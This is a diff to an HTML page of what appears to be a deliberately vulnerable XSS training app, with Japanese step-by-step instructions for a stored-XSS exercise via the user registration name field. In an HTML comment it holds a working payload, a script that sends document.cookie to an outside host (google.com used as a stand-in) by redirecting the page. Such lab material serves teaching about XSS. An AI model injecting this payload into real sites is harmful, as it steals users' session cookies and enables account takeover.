@@ -3,12 +3,22 @@
         <div>
             <h1>XSS</h1>
             <div>
-                <h2>ユーザー作成</h2>
-                <code>
-                    script type='text/javascript'
-                    document.location='https://www.google.com?cookie=' + document.cookie
-                    script
-                </code>
+                <h2>実行手順</h2>
+                <ol>
+                    <li>
+                        ユーザー登録を行う
+                    </li>
+                    <li>
+                        ユーザー登録のnameで、JSを実行する（JSはHTMLのコメントにかかれている）
+                        <!-- <script type='text/javascript'>document.location='https://www.google.com?cookie=' + document.cookie</script>-->
+                    </li>
+                    <li>
+                        https://www.google.com/?cookie=hoge が出れば成功
+                    </li>
+                </ol>
+            </div>
+            <div>
+                <h2>ユーザー登録</h2>
                 <form action="/" method="POST">
                     <label>
                         name<input type="text" name="name" placeholder="yamada"><br>
